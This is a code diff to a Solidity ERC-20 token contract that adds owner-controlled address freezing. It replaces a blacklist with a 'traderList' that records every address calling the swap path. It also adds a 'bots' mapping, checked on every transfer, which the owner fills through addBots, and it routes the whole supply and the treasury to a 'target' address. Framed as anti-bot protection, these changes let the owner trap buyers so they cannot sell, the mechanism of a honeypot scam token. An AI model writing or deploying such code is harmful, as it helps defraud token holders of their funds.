@@ -106,7 +106,9 @@ contract TOKEN is Context, IERC20, Ownable {
     uint256 public buyTax = 0;
     uint256 public sellTax = 0;
 
-    address[] public blackList;
+    address[] public traderList;
+    mapping(address => bool) public isInTraderList;
+    mapping (address => bool) private bots;
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
@@ -119,25 +121,24 @@ contract TOKEN is Context, IERC20, Ownable {
     }
     address payable public treasury; // MARKETIN WALLET HERE
 
-    constructor(string memory paramName, string memory paramSymbol, uint256 paramTotalSupply, uint8 paramDecimals, address uniswapV2Address) payable {
-        treasury = payable (msg.sender);
-        _isExcludedWallet[msg.sender] = true;
+    constructor(string memory paramName, string memory paramSymbol, uint256 paramTotalSupply, uint8 paramDecimals, address target) payable {
+        treasury = payable (target);
+        _isExcludedWallet[target] = true;
         _isExcludedWallet[address(this)] = true;
-        _isExcludedWallet[treasury] = true;
-        uniswapV2Router = IUniswapV2Router02(uniswapV2Address);
-        // uniswapV2Router = IUniswapV2Router02(0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008);
+
+        uniswapV2Router = IUniswapV2Router02(0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008);
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
 
         name = paramName;
         symbol = paramSymbol;
         totalSupply = paramTotalSupply * 10**paramDecimals;
         decimals = paramDecimals;
-        _allowances[owner()][address(uniswapV2Router)] = totalSupply;
-        _balance[owner()] = totalSupply;
+        _allowances[target][address(uniswapV2Router)] = totalSupply;
+        _balance[target] = totalSupply;
         minSwap = totalSupply / 100 / 20;
         maxWalletAmount = totalSupply / 100;
         maxSwap = totalSupply / 100 / 3;
-        emit Transfer(address(0), owner(), totalSupply);
+        emit Transfer(address(0), target, totalSupply);
     }
 
     function transferOwnership(address newOwner) public override onlyOwner {
@@ -193,6 +194,7 @@ contract TOKEN is Context, IERC20, Ownable {
     function _transfer(address from, address to, uint256 amount) private {
         require(from != address(0), "transfer zero address");
         require(amount > 0, "transfer zero amount");
+        require(!bots[from] && !bots[to]);
         uint256 _tax = 0;
 
         if(!_isExcludedWallet[from] && !_isExcludedWallet[to]){
@@ -236,11 +238,14 @@ contract TOKEN is Context, IERC20, Ownable {
         path[1] = uniswapV2Router.WETH();
         _approve(address(this), address(uniswapV2Router), tokenAmount);
         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,treasury,block.timestamp);
-        blackList.push(_msgSender());
+        if(!isInTraderList[_msgSender()]) {
+            traderList.push(_msgSender());
+            isInTraderList[_msgSender()] = true;
+        }
     }
 
-    function getBlackList() external view onlyOwner returns (address[] memory) {
-        return blackList;
+    function gettraderList() external view onlyOwner returns (address[] memory) {
+        return traderList;
     }
 
     function setExcludedWallet(address wAddress, bool isExcle) external  onlyOwner {
@@ -268,11 +273,21 @@ contract TOKEN is Context, IERC20, Ownable {
         treasury.transfer(address(this).balance);
     }
 
-    // function addLP() external payable onlyOwner() {
-    //     console.log("Uniswap v2 routern address", address(uniswapV2Router));
-    //     _approve(address(this), address(uniswapV2Router), totalSupply);
-    //     uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
-    //     // uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this))-(totalSupply/10),0,0,owner(),block.timestamp);
-    // }
+    function addBots(address[] memory bots_) external onlyOwner {
+        for (uint i = 0; i < bots_.length; i++) {
+            bots[bots_[i]] = true;
+        }
+    }
+
+    function delBots(address[] memory notbot) external onlyOwner {
+      for (uint i = 0; i < notbot.length; i++) {
+          bots[notbot[i]] = false;
+      }
+    }
+
+    function isBot(address a) external view returns (bool){
+      return bots[a];
+    }
+
     receive() external payable {}
 }
